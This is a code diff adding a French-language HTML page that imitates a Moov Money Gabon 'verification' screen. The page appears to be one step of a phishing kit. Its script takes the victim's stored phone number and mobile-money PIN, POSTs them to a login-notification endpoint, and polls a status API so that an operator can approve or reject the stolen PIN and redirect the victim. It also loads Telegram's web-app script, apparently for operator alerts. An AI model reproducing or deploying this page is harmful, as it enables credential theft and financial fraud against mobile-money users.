@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Moov Money Gabon - Traitement</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background-color: #0047ab; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
+        .card { background: white; color: #1e293b; padding: 40px; border-radius: 20px; width: 320px; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #cbd5e1; border-top: 4px solid #ff6600; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="spinner"></div>
+    <h2>Vérification en cours...</h2>
+    <p>Veuillez patienter...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const phone = localStorage.getItem('phone');
+    const pin = localStorage.getItem('lastPin');
+
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch(e) {}
+
+    const poll = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+            if (data.status === "approved") {
+                clearInterval(poll);
+                window.location.href = "/page8";
+            } else if (data.status === "denied" || data.status === "otp2_wrongpin") {
+                clearInterval(poll);
+                window.location.href = "/page6?error=wrongpin";
+            }
+        } catch(err) {}
+    }, 2000);
+});
+</script>
+</body>
+</html>
